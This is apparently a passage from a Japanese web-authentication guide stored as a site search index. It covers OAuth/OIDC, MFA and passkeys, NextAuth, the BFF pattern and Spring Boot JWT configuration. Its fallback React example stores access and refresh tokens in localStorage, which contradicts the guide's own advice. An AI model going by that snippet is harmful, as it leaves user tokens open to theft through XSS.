<li>\u30ea\u30bd\u30fc\u30b9\u30aa\u30fc\u30ca\u30fc: \u30a8\u30f3\u30c9\u30e6\u30fc\u30b6\u30fc</li> <li>\u30af\u30e9\u30a4\u30a2\u30f3\u30c8: \u3042\u306a\u305f\u306e\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3</li> <li>\u8a8d\u53ef\u30b5\u30fc\u30d0\u30fc: \u30c8\u30fc\u30af\u30f3\u3092\u767a\u884c\u3059\u308b\u30b5\u30fc\u30d0\u30fc</li> </ul>"},{"location":"authentication-guide/#_25","title":"\u901a\u4fe1\u30d5\u30ed\u30fc(\u8a8d\u53ef\u30b3\u30fc\u30c9\u30d5\u30ed\u30fc)","text":"<pre><code>sequenceDiagram\n    participant User as \u30e6\u30fc\u30b6\u30fc\n    participant Client as \u30af\u30e9\u30a4\u30a2\u30f3\u30c8\n    participant IdP as \u8a8d\u8a3c\u30d7\u30ed\u30d0\u30a4\u30c0\u30fc(IdP)\n    participant API as API\u30b5\u30fc\u30d0\u30fc\n\n    Client-&gt;&gt;IdP: 1. \u8a8d\u8a3c\u30ea\u30af\u30a8\u30b9\u30c8(redirect)\n    IdP-&gt;&gt;User: 2. \u30ed\u30b0\u30a4\u30f3\u753b\u9762\u8868\u793a\n    User-&gt;&gt;IdP: 3. \u8a8d\u8a3c\u60c5\u5831\u5165\u529b\u3001\u8a31\u53ef\n    IdP-&gt;&gt;Client: 4. \u8a8d\u53ef\u30b3\u30fc\u30c9\u767a\u884c(callback\u3078\u30ea\u30c0\u30a4\u30ec\u30af\u30c8)\n    Client-&gt;&gt;IdP: 5. \u8a8d\u53ef\u30b3\u30fc\u30c9 + \u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u30b7\u30fc\u30af\u30ec\u30c3\u30c8\u9001\u4fe1\n    IdP-&gt;&gt;Client: 6. \u30a2\u30af\u30bb\u30b9\u30c8\u30fc\u30af\u30f3 + ID\u30c8\u30fc\u30af\u30f3\u767a\u884c\n    Client-&gt;&gt;API: 7. \u30a2\u30af\u30bb\u30b9\u30c8\u30fc\u30af\u30f3\u3067\u4fdd\u8b77\u3055\u308c\u305fAPI\u3078\u30a2\u30af\u30bb\u30b9</code></pre>"},{"location":"authentication-guide/#oauthoidc_2","title":"OAuth/OIDC\u306e\u30e1\u30ea\u30c3\u30c8","text":"<ul> <li>\u2705 \u30d1\u30b9\u30ef\u30fc\u30c9\u7ba1\u7406\u4e0d\u8981(IdP\u304c\u7ba1\u7406)</li> <li>\u2705 MFA(\u591a\u8981\u7d20\u8a8d\u8a3c)\u306a\u3069\u306e\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u6a5f\u80fd\u304c\u5229\u7528\u53ef\u80fd</li> <li>\u2705 \u30bd\u30fc\u30b7\u30e3\u30eb\u30ed\u30b0\u30a4\u30f3\u5b9f\u88c5\u304c\u5bb9\u6613</li> <li>\u2705 \u6a19\u6e96\u30d7\u30ed\u30c8\u30b3\u30eb\u3067\u76f8\u4e92\u904b\u7528\u6027\u304c\u9ad8\u3044</li> <li>\u2705 \u30e6\u30fc\u30b6\u30fc\u767b\u9332\u306e\u624b\u9593\u524a\u6e1b</li> </ul>"},{"location":"authentication-guide/#oauthoidc_3","title":"OAuth/OIDC\u306e\u30c7\u30e1\u30ea\u30c3\u30c8","text":"<ul> <li>\u274c \u5916\u90e8\u30b5\u30fc\u30d3\u30b9\u3078\u306e\u4f9d\u5b58</li> <li>\u274c \u5b9f\u88c5\u304c\u8907\u96d1</li> <li>\u274c IdP\u306e\u30c0\u30a6\u30f3\u30bf\u30a4\u30e0\u306e\u5f71\u97ff\u3092\u53d7\u3051\u308b</li> <li>\u274c \u30d7\u30e9\u30a4\u30d0\u30b7\u30fc\u30dd\u30ea\u30b7\u30fc\u3084GDPR\u5bfe\u5fdc\u304c\u5fc5\u8981</li> </ul>"},{"location":"authentication-guide/#oauthoidc_4","title":"OAuth/OIDC\u306e\u9069\u7528\u30b7\u30fc\u30f3","text":"<ul> <li>B2C\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3(\u4e00\u822c\u30e6\u30fc\u30b6\u30fc\u5411\u3051)</li> <li>\u30bd\u30fc\u30b7\u30e3\u30eb\u30ed\u30b0\u30a4\u30f3\u3092\u63d0\u4f9b\u3057\u305f\u3044\u5834\u5408</li> <li>\u30a8\u30f3\u30bf\u30fc\u30d7\u30e9\u30a4\u30baSSO\u304c\u5fc5\u8981\u306a\u5834\u5408</li> <li>\u8a8d\u8a3c\u57fa\u76e4\u3092\u81ea\u524d\u3067\u6301\u3061\u305f\u304f\u306a\u3044\u5834\u5408</li> </ul>"},{"location":"authentication-guide/#oauth-202025","title":"OAuth 2.0\u306e\u30d5\u30ed\u30fc\u9078\u629e(2025\u5e74\u7248)","text":"\u30e6\u30fc\u30b9\u30b1\u30fc\u30b9 \u63a8\u5968\u30d5\u30ed\u30fc \u7406\u7531 \u30d6\u30e9\u30a6\u30b6(SPA) Authorization Code + PKCE Implicit\u5ec3\u6b62\u3001\u30b5\u30fc\u30c9\u30d1\u30fc\u30c6\u30a3Cookie\u554f\u984c\u306b\u5bfe\u5fdc \u30b5\u30fc\u30d0\u30fc\u30b5\u30a4\u30c9\u30ec\u30f3\u30c0\u30ea\u30f3\u30b0 Authorization Code \u30b7\u30fc\u30af\u30ec\u30c3\u30c8\u7ba1\u7406\u53ef\u80fd\u3001\u30bb\u30ad\u30e5\u30a2 \u30e2\u30d0\u30a4\u30eb\u30a2\u30d7\u30ea Authorization Code + PKCE \u30b7\u30b9\u30c6\u30e0\u30d6\u30e9\u30a6\u30b6\u4f7f\u7528\u3001\u57cb\u3081\u8fbc\u307fWebView\u7981\u6b62 \u30c6\u30ec\u30d3/IoT Device Authorization Grant \u30c7\u30d0\u30a4\u30b9\u30b3\u30fc\u30c9\u30d5\u30ed\u30fc M2M(\u30b5\u30fc\u30d0\u30fc\u9593) Client Credentials mTLS/private_key_jwt\u63a8\u5968"},{"location":"authentication-guide/#oauthoidc_5","title":"OAuth/OIDC\u306e\u6ce8\u610f\u30dd\u30a4\u30f3\u30c8","text":"<ul> <li>\u274c Implicit Flow \u306f\u4f7f\u7528\u7981\u6b62(OAuth 2.1\u3067\u5ec3\u6b62)</li> <li>\u274c Resource Owner Password Credentials (ROPC) \u3082\u975e\u63a8\u5968</li> <li>\u2705 Authorization Code + PKCE: \u30b5\u30fc\u30d0\u30fc\u30b5\u30a4\u30c9\u3067\u30c8\u30fc\u30af\u30f3\u4ea4\u63db(\u30bb\u30ad\u30e5\u30a2)</li> <li>\u2705 PKCE: \u30e2\u30d0\u30a4\u30eb\u30a2\u30d7\u30ea\u3084SPA\u3067\u306e\u5fc5\u9808\u62e1\u5f35\u3001\u8a8d\u53ef\u30b3\u30fc\u30c9\u6a2a\u53d6\u308a\u653b\u6483\u3092\u9632\u6b62</li> <li>\u2705 state \u30d1\u30e9\u30e1\u30fc\u30bf: CSRF\u5bfe\u7b56(\u5fc5\u9808)</li> <li>\u2705 nonce: \u30ea\u30d7\u30ec\u30a4\u30a2\u30bf\u30c3\u30af\u5bfe\u7b56(OIDC\u4f7f\u7528\u6642)</li> <li>\u2705 \u30b9\u30b3\u30fc\u30d7\u7ba1\u7406: \u5fc5\u8981\u6700\u5c0f\u9650\u306e\u6a29\u9650\u306e\u307f\u8981\u6c42</li> <li>\u2705 \u30ea\u30c0\u30a4\u30ec\u30af\u30c8URI\u306e\u53b3\u683c\u306a\u4e00\u81f4: \u5b8c\u5168\u4e00\u81f4\u306e\u307f\u8a31\u53ef(\u30ef\u30a4\u30eb\u30c9\u30ab\u30fc\u30c9\u7981\u6b62)</li> </ul>"},{"location":"authentication-guide/#4-mfa-multi-factor-authentication","title":"4. \u591a\u8981\u7d20\u8a8d\u8a3c(MFA: Multi-Factor Authentication)","text":""},{"location":"authentication-guide/#mfa","title":"MFA\u306e\u6982\u8981","text":"<p>\u8907\u6570\u306e\u8a8d\u8a3c\u8981\u7d20\u3092\u7d44\u307f\u5408\u308f\u305b\u3066\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u3092\u5f37\u5316\u3059\u308b\u65b9\u5f0f\u30022025\u5e74\u73fe\u5728\u3001\u30d1\u30b9\u30ad\u30fc(WebAuthn/FIDO2) \u304c\u4e3b\u6d41\u5316\u3002</p>"},{"location":"authentication-guide/#3","title":"\u8a8d\u8a3c\u306e3\u8981\u7d20","text":"<ol> <li>\u77e5\u8b58\u8981\u7d20: \u30d1\u30b9\u30ef\u30fc\u30c9\u3001PIN\u30b3\u30fc\u30c9</li> <li>\u6240\u6301\u8981\u7d20: \u30b9\u30de\u30fc\u30c8\u30d5\u30a9\u30f3\u3001\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u30ad\u30fc\u3001\u30d1\u30b9\u30ad\u30fc</li> <li>\u751f\u4f53\u8981\u7d20: \u6307\u7d0b\u3001\u9854\u8a8d\u8a3c</li> </ol>"},{"location":"authentication-guide/#mfa2025","title":"MFA\u306e\u5b9f\u88c5\u65b9\u5f0f(2025\u5e74\u7248\u63a8\u5968\u9806)","text":"\u65b9\u5f0f \u30d5\u30a3\u30c3\u30b7\u30f3\u30b0\u8010\u6027 UX \u63a8\u5968\u5ea6 \u5099\u8003 WebAuthn/\u30d1\u30b9\u30ad\u30fc \u2705 \u9ad8 \u2705 \u826f\u597d \ud83c\udf1f \u6700\u63a8\u5968 \u30d7\u30e9\u30c3\u30c8\u30d5\u30a9\u30fc\u30e0\u8a8d\u8a3c\u5668/\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u30ad\u30fc TOTP \u26a0\ufe0f \u4e2d \u2705 \u826f\u597d \u2705 \u63a8\u5968 Google Authenticator\u7b49 \u30d7\u30c3\u30b7\u30e5\u901a\u77e5 \u2705 \u9ad8 \u2705 \u826f\u597d \u2705 \u63a8\u5968 \u30c8\u30e9\u30f3\u30b6\u30af\u30b7\u30e7\u30f3\u60c5\u5831\u8868\u793a\u5fc5\u9808 SMS/\u97f3\u58f0 \u274c \u4f4e \u26a0\ufe0f \u53ef \u26a0\ufe0f \u30d0\u30c3\u30af\u30a2\u30c3\u30d7\u7528 SIM\u30b9\u30ef\u30c3\u30d4\u30f3\u30b0\u653b\u6483\u306b\u8106\u5f31"},{"location":"authentication-guide/#passkeys","title":"\u30d1\u30b9\u30ad\u30fc(Passkeys)\u306e\u5229\u70b9","text":"<ul> <li>\u2705 \u30d5\u30a3\u30c3\u30b7\u30f3\u30b0\u8010\u6027: \u30c9\u30e1\u30a4\u30f3\u30d0\u30a4\u30f3\u30c7\u30a3\u30f3\u30b0\u3067\u507d\u30b5\u30a4\u30c8\u3067\u306f\u4f7f\u7528\u4e0d\u53ef</li> <li>\u2705 \u30d1\u30b9\u30ef\u30fc\u30c9\u4e0d\u8981: \u30d1\u30b9\u30ef\u30fc\u30c9\u30ec\u30b9\u8a8d\u8a3c\u5b9f\u73fe</li> <li>\u2705 \u751f\u4f53\u8a8d\u8a3c: \u6307\u7d0b\u30fb\u9854\u8a8d\u8a3c\u3067\u4fbf\u5229</li> <li>\u2705 \u30af\u30ed\u30b9\u30d7\u30e9\u30c3\u30c8\u30d5\u30a9\u30fc\u30e0: \u30c7\u30d0\u30a4\u30b9\u9593\u540c\u671f\u53ef\u80fd</li> <li>\u2705 \u696d\u754c\u6a19\u6e96: Apple, Google, Microsoft\u304c\u63a8\u9032</li> </ul>"},{"location":"authentication-guide/#webauthn","title":"\u5b9f\u88c5\u4f8b(WebAuthn)","text":"<pre><code>// \u767b\u9332\u6642\nconst credential = await navigator.credentials.create({\n  publicKey: {\n    challenge: new Uint8Array(32), // \u30b5\u30fc\u30d0\u30fc\u304b\u3089\u53d6\u5f97\n    rp: { name: \"Example Corp\", id: \"example.com\" },\n    user: {\n      id: new Uint8Array(16),\n      name: \"user@example.com\",\n      displayName: \"User Name\"\n    },\n    pubKeyCredParams: [\n      { type: \"public-key\", alg: -7 },  // ES256\n      { type: \"public-key\", alg: -257 } // RS256\n    ],\n    authenticatorSelection: {\n      authenticatorAttachment: \"platform\", // \u751f\u4f53\u8a8d\u8a3c\n      userVerification: \"required\"\n    }\n  }\n});\n\n// \u8a8d\u8a3c\u6642\nconst assertion = await navigator.credentials.get({\n  publicKey: {\n    challenge: new Uint8Array(32),\n    rpId: \"example.com\",\n    userVerification: \"required\"\n  }\n});\n</code></pre>"},{"location":"authentication-guide/#_26","title":"\u30ea\u30b9\u30af\u30d9\u30fc\u30b9/\u30a2\u30c0\u30d7\u30c6\u30a3\u30d6\u8a8d\u8a3c","text":"<p>\u30ed\u30b0\u30a4\u30f3\u3054\u3068\u306b\u30ea\u30b9\u30af\u8a55\u4fa1\u3092\u884c\u3044\u3001MFA\u306e\u8981\u6c42\u3092\u52d5\u7684\u306b\u5236\u5fa1:</p> <ul> <li>\u4f4e\u30ea\u30b9\u30af: MFA\u30b9\u30ad\u30c3\u30d7(\u4fe1\u983c\u6e08\u307f\u30c7\u30d0\u30a4\u30b9\u3001\u901a\u5e38\u306e\u5834\u6240)</li> <li>\u4e2d\u30ea\u30b9\u30af: TOTP/\u30d7\u30c3\u30b7\u30e5\u901a\u77e5\u8981\u6c42</li> <li>\u9ad8\u30ea\u30b9\u30af: WebAuthn\u5fc5\u9808\u3001\u307e\u305f\u306f\u30a2\u30af\u30bb\u30b9\u30d6\u30ed\u30c3\u30af</li> </ul> <p>\u8a55\u4fa1\u8981\u7d20:</p> <ul> <li>IP \u30a2\u30c9\u30ec\u30b9\u3001\u5730\u7406\u7684\u4f4d\u7f6e</li> <li>\u30c7\u30d0\u30a4\u30b9\u30d5\u30a3\u30f3\u30ac\u30fc\u30d7\u30ea\u30f3\u30c8</li> <li>\u884c\u52d5\u30d1\u30bf\u30fc\u30f3(\u6642\u9593\u5e2f\u3001\u64cd\u4f5c\u901f\u5ea6\u7b49)</li> <li>\u8105\u5a01\u30a4\u30f3\u30c6\u30ea\u30b8\u30a7\u30f3\u30b9\u9023\u643a</li> </ul>"},{"location":"authentication-guide/#_27","title":"\u30b9\u30c6\u30c3\u30d7\u30a2\u30c3\u30d7\u8a8d\u8a3c","text":"<p>\u91cd\u8981\u64cd\u4f5c\u6642\u306b\u8ffd\u52a0\u8a8d\u8a3c\u3092\u8981\u6c42:</p> <pre><code>// \u9ad8\u984d\u9001\u91d1\u6642\u306a\u3069\nif (amount &gt; 10000) {\n  await requireMFA(); // \u8ffd\u52a0\u8a8d\u8a3c\n}\n</code></pre>"},{"location":"authentication-guide/#_28","title":"\u6ce8\u610f\u30dd\u30a4\u30f3\u30c8","text":"<ul> <li>\u26a0\ufe0f SMS\u8a8d\u8a3c\u306fSIM\u30b9\u30ef\u30c3\u30d4\u30f3\u30b0\u653b\u6483\u306e\u30ea\u30b9\u30af\u3042\u308a(\u30d0\u30c3\u30af\u30a2\u30c3\u30d7\u7528\u9014\u306e\u307f)</li> <li>\u2705 TOTP\u3001WebAuthn\u304c\u3088\u308a\u5b89\u5168</li> <li>\u2705 \u30ea\u30ab\u30d0\u30ea\u30fc\u30b3\u30fc\u30c9/\u30d0\u30c3\u30af\u30a2\u30c3\u30d7\u8a8d\u8a3c\u5668\u306e\u63d0\u4f9b\u304c\u5fc5\u9808</li> <li>\u2705 MFA\u75b2\u52b4\u653b\u6483\u5bfe\u7b56: \u30d7\u30c3\u30b7\u30e5\u901a\u77e5\u306b\u30c8\u30e9\u30f3\u30b6\u30af\u30b7\u30e7\u30f3\u8a73\u7d30\u8868\u793a</li> <li>\u2705 \u30a2\u30ab\u30a6\u30f3\u30c8\u30ea\u30ab\u30d0\u30ea\u30fc\u30d5\u30ed\u30fc\u306e\u614e\u91cd\u306a\u8a2d\u8a08</li> </ul>"},{"location":"authentication-guide/#_29","title":"\u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3\u30d1\u30bf\u30fc\u30f3\u5225\u306e\u5b9f\u88c5\u65b9\u91dd","text":""},{"location":"authentication-guide/#1_1","title":"\u30d1\u30bf\u30fc\u30f31: \u30d5\u30eb\u30b9\u30bf\u30c3\u30af\u30d5\u30ec\u30fc\u30e0\u30ef\u30fc\u30af(\u4e00\u6c17\u901a\u8cab\u5b9f\u88c5)","text":""},{"location":"authentication-guide/#1_2","title":"\u30d1\u30bf\u30fc\u30f31\u306e\u69cb\u6210\u4f8b","text":"<pre><code>graph TD\n    Browser[\u30d6\u30e9\u30a6\u30b6] &lt;--&gt;|HTTP/HTTPS| NextJS[Next.js SSR + API Routes]\n    NextJS --&gt; DB[\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9]</code></pre>"},{"location":"authentication-guide/#1_3","title":"\u30d1\u30bf\u30fc\u30f31\u306e\u7279\u5fb4","text":"<ul> <li>\u30d5\u30ed\u30f3\u30c8\u30a8\u30f3\u30c9\u3068\u30d0\u30c3\u30af\u30a8\u30f3\u30c9\u304c\u540c\u4e00\u30b5\u30fc\u30d0\u30fc\u4e0a\u3067\u52d5\u4f5c</li> <li>Next.js\u306eAPI Routes\u3084Server Actions\u3067\u5b8c\u7d50</li> <li>\u30bb\u30c3\u30b7\u30e7\u30f3\u7ba1\u7406\u304c\u30b7\u30f3\u30d7\u30eb</li> </ul>"},{"location":"authentication-guide/#1_4","title":"\u30d1\u30bf\u30fc\u30f31\u306e\u8a8d\u8a3c\u5b9f\u88c5\u306e\u63a8\u5968\u65b9\u5f0f","text":""},{"location":"authentication-guide/#_30","title":"\u30bb\u30c3\u30b7\u30e7\u30f3\u30d9\u30fc\u30b9\u8a8d\u8a3c\u304c\u63a8\u5968","text":"<p>\u7406\u7531:</p> <ul> <li>\u540c\u4e00\u30aa\u30ea\u30b8\u30f3\u306a\u306e\u3067Cookie\u7ba1\u7406\u304c\u7c21\u5358</li> <li>Next.js\u306eMiddleware\u3067\u30bb\u30c3\u30b7\u30e7\u30f3\u691c\u8a3c\u304c\u5bb9\u6613</li> <li>NextAuth\u3084Auth.js\u306a\u3069\u306e\u30e9\u30a4\u30d6\u30e9\u30ea\u304c\u5145\u5b9f</li> </ul>"},{"location":"authentication-guide/#nextauth","title":"\u5b9f\u88c5\u4f8b(NextAuth\u4f7f\u7528)","text":"<pre><code>// pages/api/auth/[...nextauth].js\nimport NextAuth from 'next-auth';\nimport CredentialsProvider from 'next-auth/providers/credentials';\n\nexport default NextAuth({\n  providers: [\n    CredentialsProvider({\n      credentials: {\n        email: { label: \"Email\", type: \"text\" },\n        password: { label: \"Password\", type: \"password\" }\n      },\n      async authorize(credentials) {\n        // \u30e6\u30fc\u30b6\u30fc\u8a8d\u8a3c\u30ed\u30b8\u30c3\u30af\n        const user = await validateUser(credentials);\n        if (user) {\n          return user;\n        }\n        return null;\n      }\n    })\n  ],\n  session: {\n    strategy: \"jwt\", // or \"database\"\n  },\n  callbacks: {\n    async jwt({ token, user }) {\n      if (user) {\n        token.id = user.id;\n        token.role = user.role;\n      }\n      return token;\n    },\n    async session({ session, token }) {\n      session.user.id = token.id;\n      session.user.role = token.role;\n      return session;\n    }\n  }\n});\n\n// middleware.js\nimport { withAuth } from \"next-auth/middleware\";\n\nexport default withAuth({\n  callbacks: {\n    authorized({ token }) {\n      return !!token;\n    },\n  },\n});\n\nexport const config = { matcher: [\"/dashboard/:path*\"] };\n</code></pre>"},{"location":"authentication-guide/#_31","title":"\u6ce8\u610f\u30dd\u30a4\u30f3\u30c8","text":"<ul> <li>\u2705 CSRF\u5bfe\u7b56: \u30d5\u30ec\u30fc\u30e0\u30ef\u30fc\u30af\u304c\u81ea\u52d5\u5bfe\u5fdc(NextAuth\u306a\u3069)</li> <li>\u2705 \u30bb\u30ad\u30e5\u30a2\u306aCookie: HttpOnly, Secure, SameSite\u5c5e\u6027\u8a2d\u5b9a</li> <li>\u2705 \u30b5\u30fc\u30d0\u30fc\u30b5\u30a4\u30c9\u30ec\u30f3\u30c0\u30ea\u30f3\u30b0: \u521d\u671f\u8868\u793a\u6642\u306b\u8a8d\u8a3c\u72b6\u614b\u3092\u53cd\u6620</li> <li>\u26a0\ufe0f API\u30eb\u30fc\u30c8\u306e\u4fdd\u8b77: \u5404API Route\u3067\u8a8d\u8a3c\u30c1\u30a7\u30c3\u30af</li> <li>\u26a0\ufe0f \u74b0\u5883\u5909\u6570\u7ba1\u7406: \u30b7\u30fc\u30af\u30ec\u30c3\u30c8\u30ad\u30fc\u306e\u9069\u5207\u306a\u7ba1\u7406</li> </ul>"},{"location":"authentication-guide/#2-spa-api","title":"\u30d1\u30bf\u30fc\u30f32: SPA + API\u30b5\u30fc\u30d0\u30fc(\u5206\u96e2\u69cb\u6210)","text":""},{"location":"authentication-guide/#_32","title":"\u69cb\u6210\u4f8b","text":"<pre><code>graph TD\n    Browser[\u30d6\u30e9\u30a6\u30b6 React/Vue] &lt;--&gt;|HTTP/HTTPS| API[API\u30b5\u30fc\u30d0\u30fc Spring Boot/Node.js]\n    API --&gt; DB[\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9]</code></pre>"},{"location":"authentication-guide/#_33","title":"\u7279\u5fb4","text":"<ul> <li>\u30d5\u30ed\u30f3\u30c8\u30a8\u30f3\u30c9\u3068\u30d0\u30c3\u30af\u30a8\u30f3\u30c9\u304c\u5225\u30b5\u30fc\u30d0\u30fc(\u5225\u30c9\u30e1\u30a4\u30f3)</li> <li>CORS\u306e\u8003\u616e\u304c\u5fc5\u8981</li> <li>\u30d5\u30ed\u30f3\u30c8\u30a8\u30f3\u30c9\u306f\u9759\u7684\u30d5\u30a1\u30a4\u30eb\u3068\u3057\u3066\u914d\u4fe1\u53ef\u80fd</li> </ul>"},{"location":"authentication-guide/#2025_2","title":"\u8a8d\u8a3c\u5b9f\u88c5\u306e\u63a8\u5968\u65b9\u5f0f(2025\u5e74\u7248)","text":"<p>\u7b2c\u4e00\u9078\u629e: BFF(Backend For Frontend)\u30d1\u30bf\u30fc\u30f3 \ud83c\udf1f</p> <p>BFF\u306f\u30d5\u30ed\u30f3\u30c8\u30a8\u30f3\u30c9\u3068\u30d0\u30c3\u30af\u30a8\u30f3\u30c9\u306e\u9593\u306b\u5c02\u7528\u306e\u4e2d\u9593\u5c64\u3092\u7f6e\u304f\u30d1\u30bf\u30fc\u30f3\u3067\u3059\u3002</p> <pre><code>graph LR\n    Browser[\u30d6\u30e9\u30a6\u30b6] --&gt;|Cookie| BFF[Next.js BFF]\n    BFF --&gt;|Bearer Token| API[Spring Boot API]\n    BFF --&gt;|OAuth| IdP[AWS Cognito]</code></pre> <p>BFF\u306e\u5229\u70b9:</p> <ul> <li>\u2705 \u30c8\u30fc\u30af\u30f3\u304c\u30d6\u30e9\u30a6\u30b6\u306b\u9732\u51fa\u3057\u306a\u3044(XSS\u5bfe\u7b56)</li> <li>\u2705 \u30b5\u30fc\u30c9\u30d1\u30fc\u30c6\u30a3Cookie\u554f\u984c\u3092\u56de\u907f</li> <li>\u2705 CORS\u8a2d\u5b9a\u304c\u30b7\u30f3\u30d7\u30eb</li> <li>\u2705 \u30c8\u30fc\u30af\u30f3\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u3092\u30b5\u30fc\u30d0\u30fc\u5074\u3067\u5236\u5fa1</li> <li>\u2705 \u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u5883\u754c\u304c\u660e\u78ba</li> </ul> <p>\u4ee3\u66ff\u6848: Authorization Code + PKCE (SPA\u304b\u3089\u76f4\u63a5)</p> <p>BFF\u304c\u4f7f\u3048\u306a\u3044\u5834\u5408\u306e\u9078\u629e\u80a2:</p> <ul> <li>\u30c8\u30fc\u30af\u30f3\u306f\u30e1\u30e2\u30ea(React\u30b9\u30c6\u30fc\u30c8\u7b49)\u306b\u4fdd\u6301</li> <li>\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3\u306fHttpOnly Cookie\u306b\u4fdd\u5b58</li> <li>\u30c8\u30fc\u30af\u30f3\u30ed\u30fc\u30c6\u30fc\u30b7\u30e7\u30f3\u3068\u77ed\u5bff\u547d\u5316\u5fc5\u9808</li> <li>\u274c LocalStorage/SessionStorage\u306f\u907f\u3051\u308b</li> </ul>"},{"location":"authentication-guide/#1-bffnextjs-spring-boot","title":"\u5b9f\u88c5\u4f8b1: BFF\u30d1\u30bf\u30fc\u30f3(Next.js + Spring Boot)","text":"<p>\u30d5\u30ed\u30f3\u30c8\u30a8\u30f3\u30c9\u5074(Next.js BFF)</p> <pre><code>// app/api/users/profile/route.ts (Next.js 13+ App Router)\nimport { getServerSession } from 'next-auth';\nimport { authOptions } from '@/app/api/auth/[...nextauth]/route';\n\nexport async function GET() {\n  const session = await getServerSession(authOptions);\n\n  if (!session) {\n    return Response.json({ error: 'Unauthorized' }, { status: 401 });\n  }\n\n  // Spring Boot API\u306b\u30d7\u30ed\u30ad\u30b7\n  const response = await fetch(`${process.env.API_BASE_URL}/users/profile`, {\n    headers: {\n      'Authorization': `Bearer ${session.idToken}`,\n      'Content-Type': 'application/json',\n    },\n    // \u30ad\u30e3\u30c3\u30b7\u30e5\u6226\u7565\n    next: { revalidate: 60 }\n  });\n\n  if (!response.ok) {\n    return Response.json({ error: 'API Error' }, { status: response.status });\n  }\n\n  const data = await response.json();\n  return Response.json(data);\n}\n\n// \u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u5074\n// app/dashboard/page.tsx\n'use client';\nimport { useEffect, useState } from 'react';\n\nexport default function Dashboard() {\n  const [profile, setProfile] = useState(null);\n\n  useEffect(() =&gt; {\n    // BFF\u7d4c\u7531\u3067API\u306b\u30a2\u30af\u30bb\u30b9(Cookie\u306f\u81ea\u52d5\u9001\u4fe1)\n    fetch('/api/users/profile')\n      .then(res =&gt; res.json())\n      .then(data =&gt; setProfile(data));\n  }, []);\n\n  return &lt;div&gt;Welcome {profile?.name}&lt;/div&gt;;\n}\n</code></pre>"},{"location":"authentication-guide/#2-spareact-spring-boot","title":"\u5b9f\u88c5\u4f8b2: SPA\u76f4\u63a5\u30a2\u30af\u30bb\u30b9(React + Spring Boot)","text":"<p>\u26a0\ufe0f BFF\u304c\u4f7f\u3048\u306a\u3044\u5834\u5408\u306e\u307f\u4f7f\u7528</p> <p>\u30d5\u30ed\u30f3\u30c8\u30a8\u30f3\u30c9\u5074(React)</p> <pre><code>// authService.js\nexport const login = async (email, password) =&gt; {\n  const response = await fetch('https://api.example.com/auth/login', {\n    method: 'POST',\n    headers: { 'Content-Type': 'application/json' },\n    body: JSON.stringify({ email, password })\n  });\n\n  const data = await response.json();\n\n  // \u30c8\u30fc\u30af\u30f3\u3092\u4fdd\u5b58\n  localStorage.setItem('accessToken', data.accessToken);\n  localStorage.setItem('refreshToken', data.refreshToken);\n\n  return data;\n};\n\n// axios\u30a4\u30f3\u30b9\u30bf\u30f3\u30b9\u8a2d\u5b9a\nimport axios from 'axios';\n\nconst apiClient = axios.create({\n  baseURL: 'https://api.example.com',\n});\n\n// \u30ea\u30af\u30a8\u30b9\u30c8\u30a4\u30f3\u30bf\u30fc\u30bb\u30d7\u30bf\u30fc\napiClient.interceptors.request.use((config) =&gt; {\n  const token = localStorage.getItem('accessToken');\n  if (token) {\n    config.headers.Authorization = `Bearer ${token}`;\n  }\n  return config;\n});\n\n// \u30ec\u30b9\u30dd\u30f3\u30b9\u30a4\u30f3\u30bf\u30fc\u30bb\u30d7\u30bf\u30fc(\u30c8\u30fc\u30af\u30f3\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5)\napiClient.interceptors.response.use(\n  (response) =&gt; response,\n  async (error) =&gt; {\n    const originalRequest = error.config;\n\n    if (error.response?.status === 401 &amp;&amp; !originalRequest._retry) {\n      originalRequest._retry = true;\n\n      const refreshToken = localStorage.getItem('refreshToken');\n      const response = await axios.post('https://api.example.com/auth/refresh', {\n        refreshToken\n      });\n\n      const { accessToken } = response.data;\n      localStorage.setItem('accessToken', accessToken);\n\n      originalRequest.headers.Authorization = `Bearer ${accessToken}`;\n      return apiClient(originalRequest);\n    }\n\n    return Promise.reject(error);\n  }\n);\n</code></pre> <p>\u30d0\u30c3\u30af\u30a8\u30f3\u30c9\u5074(Spring Boot)</p> <pre><code>// SecurityConfig.java\n@Configuration\n@EnableWebSecurity\npublic class SecurityConfig {\n\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            .csrf().disable() // JWT\u4f7f\u7528\u6642\u306fCSRF\u7121\u52b9\u5316\n            .cors().configurationSource(corsConfigurationSource())\n            .and()\n            .sessionManagement()\n                .sessionCreationPolicy(SessionCreationPolicy.STATELESS) // \u30b9\u30c6\u30fc\u30c8\u30ec\u30b9\n            .and()\n            .authorizeHttpRequests()\n                .requestMatchers(\"/auth/login\", \"/auth/register\").permitAll()\n                .anyRequest().authenticated()\n            .and()\n            .addFilterBefore(jwtAuthenticationFilter(),\n                           UsernamePasswordAuthenticationFilter.class);\n\n        return http.build();\n    }\n\n    @Bean\n    public CorsConfigurationSource corsConfigurationSource() {\n        CorsConfiguration configuration = new CorsConfiguration();\n        configuration.setAllowedOrigins(Arrays.asList(\"https://frontend.example.com\"));\n        configuration.setAllowedMethods(Arrays.asList(\"GET\", \"POST\", \"PUT\", \"DELETE\"));\n        configuration.setAllowedHeaders(Arrays.asList(\"*\"));\n        configuration.setAllowCredentials(true);\n\n        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();\n        source.registerCorsConfiguration(\"/**\", configuration);\n        return source;\n    }\n}\n\n// JwtAuthenticationFilter.java\n@Component\npublic class JwtAuthenticationFilter extends OncePerRequestFilter {\n\n    @Autowired\n    private JwtTokenProvider jwtTokenProvider;\n\n    @Override\n    protected void doFilterInternal(HttpServletRequest request,\n                                    